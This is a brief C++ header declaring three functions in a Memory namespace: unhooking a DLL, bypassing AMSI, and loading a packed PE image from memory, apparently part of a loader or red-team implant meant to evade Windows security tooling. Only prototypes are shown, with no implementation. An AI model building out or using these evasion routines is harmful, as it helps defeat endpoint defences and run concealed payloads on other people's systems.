#pragma once
#include "Function.h"

namespace Memory
{
	bool UnHookDLL(WCHAR* filePath);
	bool BypassAmsi();
	int Load_PE(char* packed_data);
};

